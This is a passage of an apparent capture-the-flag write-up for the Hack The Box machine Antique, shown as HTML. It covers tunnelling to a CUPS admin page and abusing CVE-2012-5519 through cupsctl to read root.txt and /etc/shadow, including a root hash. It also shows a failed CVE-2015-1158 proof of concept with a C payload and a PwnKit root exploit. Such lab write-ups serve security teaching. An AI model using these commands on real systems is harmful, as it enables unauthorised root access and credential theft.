+</span></code></pre></div></div>
+<p>This tells <code class="language-plaintext highlighter-rouge">chisel</code> to connect to my VM on 9000, and to create a listening on my VM on 9631 (I can’t use ports under 1024 because I didn’t run the server as root). Any traffic that hits that listening port will be forwarded by <code class="language-plaintext highlighter-rouge">chisel</code> to Antique and then send to port 631 on Antique from Antique.</p>
+<p>On my host, pointing Firefox at <code class="language-plaintext highlighter-rouge">localhost:9631</code> loads the page.</p>
+<h4 id="page">Page</h4>
+<p>The page is a CUPS page:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220502093143737.webp" type="image/webp"/>
+<img alt="image-20220502093143737" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220502093143737.png"/>
+</picture>
+<p><a href="http://www.cups.org/">CUPS</a> is an open-source printing system.</p>
+<p>The “Administration” tab shows the printers that are connected (none), as well as jobs, classes, and other bits of administrative information.</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220502100304702.webp" type="image/webp"/>
+<img alt="image-20220502100304702" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220502100304702.png"/>
+</picture>
+<p>The “Server” section has links to show various logs. If I try to edit and save the configuration file, it pops asking for auth, which I don’t have.</p>
+<p>In the error log, I can see the request I made earlier:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220502100408767.webp" type="image/webp"/>
+<img alt="image-20220502100408767" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220502100408767.png"/>
+</picture>
+<h3 id="cve-2012-5519">CVE-2012-5519</h3>
+<h4 id="background">Background</h4>
+<p>Some Goolging for vulnerabilities in CUPs returns CVE-2012-5519, file read as root in CUPS 1.6.1, which matches the version here.</p>
+<p><a href="https://www.infosecmatter.com/metasploit-module-library/?mm=post/multi/escalate/cups_root_file_read">This article</a> does a really nice job of both showing how to run the Metasploit module, and breaking down how it might fail.</p>
+<p>Looking at <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/post/multi/escalate/cups_root_file_read.rb">the exploit source</a>, it’s using <code class="language-plaintext highlighter-rouge">cupsctl</code> (saved in the <code class="language-plaintext highlighter-rouge">ctl_path</code> variable) in a current session to set the error log to a different file (<code class="language-plaintext highlighter-rouge">datastore['FILE']</code>):</p>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cmd_exec</span><span class="p">(</span><span class="s2">"</span><span class="si">#{</span><span class="n">ctl_path</span><span class="si">}</span><span class="s2"> ErrorLog=</span><span class="si">#{</span><span class="n">datastore</span><span class="p">[</span><span class="s1">'FILE'</span><span class="p">]</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
+</code></pre></div></div>
+<h4 id="read-flag">Read Flag</h4>
+<p>The first thing I can do is get <code class="language-plaintext highlighter-rouge">root.txt</code>. I’ll set it as the error log:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:~$</span><span class="w"> </span>cupsctl <span class="nv">ErrorLog</span><span class="o">=</span>/root/root.txt
+</code></pre></div></div>
+<p>Now I’ll just request that same URL:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:~$</span><span class="w"> </span>curl 127.0.0.1:631/admin/log/error_log?
+<span class="go">b7d0a7d5ede96350d003e590c241cdc9
+</span></code></pre></div></div>
+<p>It works!</p>
+<h4 id="shell-failures">Shell Failures</h4>
+<p>I am able to read <code class="language-plaintext highlighter-rouge">/etc/shadow</code> to get the hashes of users on the filesystem:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:/dev/shm$</span><span class="w"> </span>cupsctl <span class="nv">ErrorLog</span><span class="o">=</span>/etc/shadow
+<span class="gp">lp@antique:/dev/shm$</span><span class="w"> </span>curl 127.0.0.1:631/admin/log/error_log?
+<span class="go">root:$6$UgdyXjp3KC.86MSD$sMLE6Yo9Wwt636DSE2Jhd9M5hvWoy6btMs.oYtGQp7x4iDRlGCGJg8Ge9NO84P5lzjHN1WViD3jqX/VMw4LiR.:18760:0:99999:7:::
+daemon:*:18375:0:99999:7:::
+bin:*:18375:0:99999:7:::
+...[snip]...
+</span></code></pre></div></div>
+<p>The only user with a hash is root. I can try to crack it using <code class="language-plaintext highlighter-rouge">hashcat</code>, putting that full line into a file (<code class="language-plaintext highlighter-rouge">hash</code>), and running:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$</span><span class="w"> </span>/opt/hashcat-6.2.5/hashcat.bin <span class="nb">hash</span> /usr/share/wordlists/rockyou.txt <span class="nt">--user</span>
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>To run all of <code class="language-plaintext highlighter-rouge">rockyou.txt</code> will take over 8 hours, and it won’t find the password.</p>
+<p>I’ll also check to see if there’s an SSH key in <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code>, but the file doesn’t exist:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:/dev/shm$</span><span class="w"> </span>cupsctl <span class="nv">ErrorLog</span><span class="o">=</span>/root/.ssh/id_rsa
+<span class="gp">lp@antique:/dev/shm$</span><span class="w"> </span>curl 127.0.0.1:631/admin/log/error_log?
+<span class="go">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"&gt;
+&lt;HTML&gt;
+&lt;HEAD&gt;
+        &lt;META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=utf-8"&gt;
+        &lt;TITLE&gt;Not Found - CUPS v1.6.1&lt;/TITLE&gt;
+        &lt;LINK REL="STYLESHEET" TYPE="text/css" HREF="/cups.css"&gt;
+&lt;/HEAD&gt;
+&lt;BODY&gt;
+&lt;H1&gt;Not Found&lt;/H1&gt;
+&lt;P&gt;&lt;/P&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;
+</span></code></pre></div></div>
+<p>I will get a shell an unintended way in <a href="#pwnkit">Beyond Root</a>.</p>
+<h2 id="beyond-root">Beyond Root</h2>
+<h3 id="cve-2015-1158">CVE-2015-1158</h3>
+<p>In Googling for CUPS vulnerabilities, I’ll come across CVE-2015-1158, which is remote code execution in CUPS &lt; 2.0.3, which could very well include 1.6.1.</p>
+<p><a href="https://github.com/0x00string/oldays/blob/master/CVE-2015-1158.py">This script</a> is a POC, so I’ll give it a try.</p>
+<p>Downloading it, it’s a Python2 script, and it takes a host, a port, and a library to run:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python2 cve-2015-1158.py             ...[snip]...
+<span class="go">python script.py &lt;args&gt;
+   -h, --help:             Show this message
+   -a, --rhost:            Target IP address
+   -b, --rport:            Target IPP service port
+   -c, --lib               /path/to/payload.so
+   -f, --stomp-only        Only stomp the ACL (no postex)
+
+Examples:
+python script.py -a 10.10.10.10 -b 631 -f
+python script.py -a 10.10.10.10 -b 631 -c /tmp/x86reverseshell.so
+</span></code></pre></div></div>
+<p>I’ll create a simple <code class="language-plaintext highlighter-rouge">.so</code> file:</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span>
+<span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">constructor</span><span class="p">))</span> <span class="n">evil</span><span class="p">();</span>
+
+<span class="kt">void</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{};</span>
+
+<span class="kt">void</span> <span class="nf">evil</span><span class="p">()</span> <span class="p">{</span>
+    <span class="n">system</span><span class="p">(</span><span class="s">"touch /0xdf"</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>If this works, it will create a file at the filesystem root.</p>
+<p>I’ll compile it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>gcc <span class="nt">-shared</span> <span class="nt">-o</span> so.so <span class="nt">-fPIC</span> so.c 
+</code></pre></div></div>
+<p>And upload it to Antique using a Python webserver on my host and <code class="language-plaintext highlighter-rouge">wget</code> on Antique. Now, I’ll run the exploit through the tunnel:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>python2 cve-2015-1158.py <span class="nt">-a</span> 127.0.0.1 <span class="nt">-b</span> 9631 <span class="nt">-c</span> /tmp/so.so
+<span class="go">...[snip]...
+[*]     locate available printer
+[-]     no printers
+</span></code></pre></div></div>
+<p>It fails because there are no printers available (something I noted above in the admin website).</p>
+<h3 id="pwnkit">PwnKit</h3>
+<h4 id="find-vulnerable">Find Vulnerable</h4>
+<p>Something like <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS">LinPEAS</a> will identify this host is vulnerable. This <a href="https://www.datadoghq.com/blog/pwnkit-vulnerability-overview-and-remediation/">post from Datadog</a> shows how to manually check by running <code class="language-plaintext highlighter-rouge">dpkg -s policykit-1</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:/dev/shm$</span><span class="w"> </span>dpkg <span class="nt">-s</span> policykit-1
+<span class="go">Package: policykit-1
+Status: install ok installed
+Priority: optional
+Section: admin
+Installed-Size: 560
+Maintainer: Ubuntu Developers &lt;ubuntu-devel-discuss@lists.ubuntu.com&gt;
+Architecture: amd64
+Multi-Arch: foreign
+Version: 0.105-26ubuntu1.1
+Depends: dbus, libpam-systemd, libc6 (&gt;= 2.7), libexpat1 (&gt;= 2.0.1), libglib2.0-0 (&gt;= 2.37.3), libpam0g (&gt;= 0.99.7.1), libpolkit-agent-1-0 (= 0.105-26ubuntu1.1), libpolkit-gobject-1-0 (= 0.105-26ubuntu1.1), libsystemd0 (&gt;= 213)
+Conffiles:
+ /etc/pam.d/polkit-1 7c794427f656539b0d4659b030904fe0
+ /etc/polkit-1/localauthority.conf.d/50-localauthority.conf 2adb9d174807b0a3521fabf03792fbc8
+ /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf c4dbd2117c52f367f1e8b8c229686b10
+Description: framework for managing administrative policies and privileges
+ PolicyKit is an application-level toolkit for defining and handling the policy
+ that allows unprivileged processes to speak to privileged processes.
+</span><span class="c"> .
+</span><span class="go"> It is a framework for centralizing the decision making process with respect to
+ granting access to privileged operations for unprivileged (desktop)
+ applications.
+Homepage: https://www.freedesktop.org/wiki/Software/polkit/
+Original-Maintainer: Utopia Maintenance Team &lt;pkg-utopia-maintainers@lists.alioth.debian.org&gt;
+</span></code></pre></div></div>
+<p>The important line is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Version: 0.105-26ubuntu1.1
+</code></pre></div></div>
+<p>According to this table from the Datadog post, that’s the last vulnerable version on Ubuntu 20.04 focal:</p>
+<picture>
+<source srcset="https://0xdfimages.gitlab.io/img/image-20220502102910695.webp" type="image/webp"/>
+<img alt="image-20220502102910695" class="include_image" loading="lazy" src="https://0xdfimages.gitlab.io/img/image-20220502102910695.png"/>
+</picture>
+<h4 id="exploit">Exploit</h4>
+<p>This box is actually vulnerable to <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">PwnKit</a>. I’ll download a POC exploit (I like <a href="https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py">this one from Joe Ammond</a>), and upload it to Antique. From there, it’s as simple as running the script:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">lp@antique:/dev/shm$</span><span class="w"> </span>python3 CVE-2021-4034.py
+<span class="go">[+] Creating shared library for exploit code.
+[+] Calling execve()
+</span><span class="c"># id
+</span><span class="go">uid=0(root) gid=7(lp) groups=7(lp),19(lpadmin)
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2022/05/03/htb-antique.html"></a>
+</article>
